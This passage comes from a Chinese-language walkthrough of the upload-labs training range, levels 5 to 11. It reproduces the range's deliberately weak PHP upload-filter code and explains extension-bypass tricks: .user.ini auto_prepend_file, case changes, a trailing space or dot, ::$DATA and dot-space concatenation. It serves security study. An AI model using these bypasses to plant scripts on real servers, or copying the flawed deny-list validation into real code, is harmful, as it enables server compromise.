+<p>其实我上面的步骤做错了，注意<code>.htaccess</code>文件不能起名字，他就是<code>.htaccess</code>文件，如果你将他改为<code>4.htaccess</code>或者其他的什么名字是不可以的，无法解析。在实战中有可能上传上去这个文件会被自动重命名，被重命名了就不可以了。</p>
+</li>
+</ol>
+<h2 id="pass-05-userini">Pass-05 文件名后缀校验 (配置文件解析控制) .user.ini<a class="headerlink" href="#pass-05-userini" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><strong><em>htaccess</em></strong>
+作用:  分布式配置文件，一般用于 URL·重写、认证、访问控制等(作用范围:特定目录 (一般是网站根目录) 及其子目录
+优先级:  较高，可覆盖 Apache·的主要配置文件(httpd-conf)
+生效方式:  修改后立刻生效“</p>
+<p><strong><em>httpd-conf</em></strong>
+作用:  包含 ApacheHTTP·服务器的全局行为和默认设置作用范围:整个服务器
+优先级:  较低
+生效方式:  管理员权限，重启服务器后生效“</p>
+<p><strong><em>.user.ini</em></strong>
+作用:  特定于用户或特定目录的配置文件,通常位于·Web·应用程序的根目录下。它用于覆盖或追加全局配置文件 (如php.ini) 中的PHP配置选项。作用范围:存放该文件的目录以及其子目录
+优先级:  较高，可以覆盖 php.ini
+生效方式:  立即生效
+<strong><em>php.ini</em></strong>
+作用:存储了对整个·PHP·环境生效的配置选项。它通常位于PHP安装目录中作用范围:所有运行在该PHP环境中的PHP请求
+优先级:  较低
+生效方式:  重启 php或 web 服务器</p>
+<p><strong><em>加载方式:</em></strong> 会首先加载php.ini/httpd-conf 文件中的配置。然而，如果在某个目录下存在.userini/.htaccess文件服务器会在处理请求时检查该目录，并覆盖相应的配置项。</p>
+<p>.user.ini 文件上传漏洞的前提：
+.user.ini 可以生效并且该上传目录有PHP文件</p>
+<ol>
+<li>我们像上关一样上传.htaccess文件，但提示 “此文件类型不允许上传！” 说明过滤了该文件。那我们就先制作一个jpg文件，注意，这个jpg文件并不是正常的文件，这个文件是先将一个php文件内容设置为<code>&lt;?php  phpinfo(); ?&gt;</code>,然后再将此文件后缀改为jpg得到的。</li>
+<li>接下来我们再写一个<code>.user.ini</code>文件，其内容为<code>auto_prepend_file=1.jpg</code>,理解这个语句可以先将其理解为<code>include</code>，意思是在执行操作前先运行一下<code>1.jpg</code>文件中的内容，而我们的<code>jpg</code>中便是一些php代码。</li>
+</ol>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/14.jpg" /></p>
+<ol>
+<li>之后我们先上传<code>.user.ini</code>文件，再上传<code>1.jpg</code>文件即可<blockquote>
+<p>想要引发 .user.ini 解析漏洞需要三个前提条件：</p>
+<ul>
+<li>服务器脚本语言为PHP</li>
+<li>服务器使用CGI/FastCGI模式</li>
+<li>上传目录下要有可执行的php文件</li>
+</ul>
+</blockquote>
+</li>
+</ol>
+<h2 id="pass-06">Pass-06 文件名后缀校验 (大小写绕过)<a class="headerlink" href="#pass-06" title="Permanent link">&para;</a></h2>
+<ol>
+<li>我们先分析分析后端代码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-4-2"><span class="x">$msg = null;</span>
+</span><span id="__span-4-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-4-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-4-5"><span class="x">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span>
+</span><span id="__span-4-6"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-4-7"><span class="x">        $file_name = deldot($file_name);//删除文件名末尾的点</span>
+</span><span id="__span-4-8"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-4-9"><span class="x">        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</span>
+</span><span id="__span-4-10"><span class="x">        $file_ext = trim($file_ext); //首尾去空</span>
+</span><span id="__span-4-11">
+</span><span id="__span-4-12"><span class="x">        if (!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-4-13"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-4-14"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span>
+</span><span id="__span-4-15"><span class="x">            if (move_uploaded_file($temp_file, $img_path)) {</span>
+</span><span id="__span-4-16"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-4-17"><span class="x">            } else {</span>
+</span><span id="__span-4-18"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-4-19"><span class="x">            }</span>
+</span><span id="__span-4-20"><span class="x">        } else {</span>
+</span><span id="__span-4-21"><span class="x">            $msg = &#39;此文件类型不允许上传！&#39;;</span>
+</span><span id="__span-4-22"><span class="x">        }</span>
+</span><span id="__span-4-23"><span class="x">    } else {</span>
+</span><span id="__span-4-24"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-4-25"><span class="x">    }</span>
+</span><span id="__span-4-26"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 通过分析发现代码里面少了<code>strtolower</code>，这说明我们可以尝试大小写绕过。
+我们尝试将<code>1.php</code>改为<code>1.phP</code>，上传成功</p>
+<blockquote>
+<p><strong>大小写绕过原理</strong>： <code>Windows</code>系统下 ，对于文件名中的大小写不敏感。例如：test.php和 TeSt.PHP 是一 样的。
+<code>Linux</code>系统下 ，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/9.jpg" /></p>
+<h2 id="pass-07">Pass-07 文件名后缀校验 (空格绕过)<a class="headerlink" href="#pass-07" title="Permanent link">&para;</a></h2>
+<ol>
+<li>我们还是先看一看后端代码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-5-2"><span class="x">$msg = null;</span>
+</span><span id="__span-5-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-5-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-5-5"><span class="x">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span>
+</span><span id="__span-5-6"><span class="x">        $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</span>
+</span><span id="__span-5-7"><span class="x">        $file_name = deldot($file_name);//删除文件名末尾的点</span>
+</span><span id="__span-5-8"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-5-9"><span class="x">        $file_ext = strtolower($file_ext); //转换为小写</span>
+</span><span id="__span-5-10"><span class="x">        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</span>
+</span><span id="__span-5-11">
+</span><span id="__span-5-12"><span class="x">        if (!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-5-13"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-5-14"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span>
+</span><span id="__span-5-15"><span class="x">            if (move_uploaded_file($temp_file,$img_path)) {</span>
+</span><span id="__span-5-16"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-5-17"><span class="x">            } else {</span>
+</span><span id="__span-5-18"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-5-19"><span class="x">            }</span>
+</span><span id="__span-5-20"><span class="x">        } else {</span>
+</span><span id="__span-5-21"><span class="x">            $msg = &#39;此文件不允许上传&#39;;</span>
+</span><span id="__span-5-22"><span class="x">        }</span>
+</span><span id="__span-5-23"><span class="x">    } else {</span>
+</span><span id="__span-5-24"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-5-25"><span class="x">    }</span>
+</span><span id="__span-5-26"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 观察发现，本关少了一步首尾去空的步骤（<code>$file_ext = trim($file_ext);</code> ），这样的话我们可以采取空格绕过。
+    但是有一个问题：在windows系统下对文件重命名，系统会自动将后缀结尾的空格删除，而我们的解决方案便是burp抓包修改</p>
+<ol>
+<li>我们上传文件，在Burp中抓包。将“1.php”修改为“1.php ”(后者最后有空格)，放行拦截到的数据包，上传成功。</li>
+</ol>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/10.jpg" /></p>
+<h2 id="pass-08">Pass-08 文件名后缀校验 (点号绕过)<a class="headerlink" href="#pass-08" title="Permanent link">&para;</a></h2>
+<ol>
+<li>分析后端代码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-6-2"><span class="x">$msg = null;</span>
+</span><span id="__span-6-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-6-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-6-5"><span class="x">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span>
+</span><span id="__span-6-6"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-6-7"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-6-8"><span class="x">        $file_ext = strtolower($file_ext); //转换为小写</span>
+</span><span id="__span-6-9"><span class="x">        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</span>
+</span><span id="__span-6-10"><span class="x">        $file_ext = trim($file_ext); //首尾去空</span>
+</span><span id="__span-6-11">
+</span><span id="__span-6-12"><span class="x">        if (!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-6-13"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-6-14"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</span>
+</span><span id="__span-6-15"><span class="x">            if (move_uploaded_file($temp_file, $img_path)) {</span>
+</span><span id="__span-6-16"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-6-17"><span class="x">            } else {</span>
+</span><span id="__span-6-18"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-6-19"><span class="x">            }</span>
+</span><span id="__span-6-20"><span class="x">        } else {</span>
+</span><span id="__span-6-21"><span class="x">            $msg = &#39;此文件类型不允许上传！&#39;;</span>
+</span><span id="__span-6-22"><span class="x">        }</span>
+</span><span id="__span-6-23"><span class="x">    } else {</span>
+</span><span id="__span-6-24"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-6-25"><span class="x">    }</span>
+</span><span id="__span-6-26"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 分析发现：没有对上传的文件后缀名未做去点.的操作 <code>strrchr($file_name, '. ')</code>，那我们将后缀改为“1.php.”不就好了？错了，依旧不行，windows系统会自动删除后缀最后的点，所以我们依旧是Burp抓包修改。上传成功。
+<img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/11.jpg" />
+<img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/12.jpg" /></p>
+<h2 id="pass-09-data">Pass-09 文件名后缀校验 (::$DATA 绕过)<a class="headerlink" href="#pass-09-data" title="Permanent link">&para;</a></h2>
+<p>解析：在php+windows的情况下：如果文件名+"<code>::$DATA</code>"会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名.且保持"<code>::$DATA</code>"之前的文件名。利用<code>windows</code>特性，可在后缀名中加” <code>::$DATA</code>”绕过。</p>
+<ol>
+<li>分析后端代码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-7-2"><span class="x">$msg = null;</span>
+</span><span id="__span-7-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-7-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-7-5"><span class="x">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span>
+</span><span id="__span-7-6"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-7-7"><span class="x">        $file_name = deldot($file_name);//删除文件名末尾的点</span>
+</span><span id="__span-7-8"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-7-9"><span class="x">        $file_ext = strtolower($file_ext); //转换为小写</span>
+</span><span id="__span-7-10"><span class="x">        $file_ext = trim($file_ext); //首尾去空</span>
+</span><span id="__span-7-11">
+</span><span id="__span-7-12"><span class="x">        if (!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-7-13"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-7-14"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span>
+</span><span id="__span-7-15"><span class="x">            if (move_uploaded_file($temp_file, $img_path)) {</span>
+</span><span id="__span-7-16"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-7-17"><span class="x">            } else {</span>
+</span><span id="__span-7-18"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-7-19"><span class="x">            }</span>
+</span><span id="__span-7-20"><span class="x">        } else {</span>
+</span><span id="__span-7-21"><span class="x">            $msg = &#39;此文件类型不允许上传！&#39;;</span>
+</span><span id="__span-7-22"><span class="x">        }</span>
+</span><span id="__span-7-23"><span class="x">    } else {</span>
+</span><span id="__span-7-24"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-7-25"><span class="x">    }</span>
+</span><span id="__span-7-26"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 分析本关源码：我们会发现本关少了去除字符串的一步，<code>$file_ext = str_ireplace('::$DATA', '', $file_ext);</code>
+那我们便在这里弄一些小操作，我们用Burp抓包，之后将文件名最后加上“<code>::$DATA</code>”，上传成功。
+<img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/13.jpg" />
+3. 我猜你看到这里的时候并不是很明白，请在看看下面的文字吧：我们在文件的后缀中加上$"<code>::$DATA</code>"，可以绕过验证，而在<code>windows</code>系统中，文件名不允许包含“:”等非法字符,所以后端在接收到此文件之后，会自动将文件后面的<code>::$DATA</code>去掉，从而其实后缀变为.php</p>
+<h2 id="pass-10">Pass-10 文件名后缀校验 (拼接绕过)<a class="headerlink" href="#pass-10" title="Permanent link">&para;</a></h2>
+<ol>
+<li>后端代码如下：</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-8-2"><span class="x">$msg = null;</span>
+</span><span id="__span-8-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-8-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-8-5"><span class="x">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span>
+</span><span id="__span-8-6"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-8-7"><span class="x">        $file_name = deldot($file_name);//删除文件名末尾的点</span>
+</span><span id="__span-8-8"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-8-9"><span class="x">        $file_ext = strtolower($file_ext); //转换为小写</span>
+</span><span id="__span-8-10"><span class="x">        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</span>
+</span><span id="__span-8-11"><span class="x">        $file_ext = trim($file_ext); //首尾去空</span>
+</span><span id="__span-8-12">
+</span><span id="__span-8-13"><span class="x">        if (!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-8-14"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-8-15"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</span>
+</span><span id="__span-8-16"><span class="x">            if (move_uploaded_file($temp_file, $img_path)) {</span>
+</span><span id="__span-8-17"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-8-18"><span class="x">            } else {</span>
+</span><span id="__span-8-19"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-8-20"><span class="x">            }</span>
+</span><span id="__span-8-21"><span class="x">        } else {</span>
+</span><span id="__span-8-22"><span class="x">            $msg = &#39;此文件类型不允许上传！&#39;;</span>
+</span><span id="__span-8-23"><span class="x">        }</span>
+</span><span id="__span-8-24"><span class="x">    } else {</span>
+</span><span id="__span-8-25"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-8-26"><span class="x">    }</span>
+</span><span id="__span-8-27"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+<ol>
+<li>分析发现：先将首尾去空，又去除了<code>::$DATA</code>又转换为小写，再删去末尾的点。这样一来我们构造文件名，使其经过过滤后得到的还是php的文件名不就行了，所以就1.php. . 就可以绕过，也就是点+空格+点+空格绕过</li>
+</ol>
+<h2 id="pass-11">Pass-11 文件名后缀校验 (双写绕过)<a class="headerlink" href="#pass-11" title="Permanent link">&para;</a></h2>
+<ol>
+<li>瞅瞅后端源码：</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
